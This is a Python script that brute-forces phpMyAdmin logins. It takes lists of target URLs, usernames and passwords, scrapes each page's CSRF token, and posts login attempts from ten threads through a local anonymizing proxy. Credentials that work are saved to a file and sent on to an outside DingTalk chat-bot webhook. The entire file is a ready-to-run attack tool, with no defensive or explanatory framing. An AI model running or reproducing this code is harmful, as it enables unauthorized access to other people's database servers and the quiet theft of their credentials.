import requests
import json


import requests
from lxml import etree
from queue import Queue
import threading
class FuckPhpmyadmin:
    url_list=Queue()
    def __init__(self):
        print("Start........")
    def Load_Url(self,file,user,passx):
        files=open(file).read().split("\n")
        for file in files:
            userses=open(user).read().split("\n")
            for userx in userses:
                passes=open(passx).read().split("\n")
                for pa in passes:
                    self.url_list.put(file+"|"+userx+"|"+pa)
    def Start(self,max):
        for i in range(max):
            threading.Thread(target=self.Brute_start).start()
    def Brute_start(self):
        while not self.url_list.empty():
            url=str(self.url_list.get()).split("|")
            try:
                if self.Brute_kernel(url[0],url[1],url[2])==0:
                    break
            except:
                    print("something is wrong")
                    print(url)
                    break

    def Brute_kernel(self,url,username,password):
        try:
            http=requests.Session()
            headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36"
            }
            xpose=http.get(url,proxies={"http":"http://127.0.0.1:8118"}).text
            html=etree.HTML(xpose,etree.HTMLParser())
            token=html.xpath("//html//input[@name='token']//@value")[0]
            data={
                    "pma_username": username,
                    "pma_password": password,
                    "server": "1",
                    "target": "index.php",
                    "token": token
            }
            res=http.post(url,data=data,headers=headers,proxies={"http":"http://127.0.0.1:8118"}).text
            if "information_schema" in res:
                write_line="url:"+url+" | user:"+username+" | pass:"+password+" SUCCESS"
                data={
                    "msgtype":"text",
                    "text":{"content":"喵喵喵,%s"%write_line}
                }
                data=json.dumps(data)
                requests.post("https://oapi.dingtalk.com/robot/send?access_token=",data=data,headers={'Content-Type': 'application/json'})
                print(write_line)
                with open("success.txt","a") as f:
                    f.write(write_line+"\n")
                return 0
            else:
                print("fail",url,username,password)
                return 1
        except:
            print("NOT EXIT")
instance=FuckPhpmyadmin()
instance.Load_Url("url.txt","user.txt","pass.txt")
instance.Start(10)
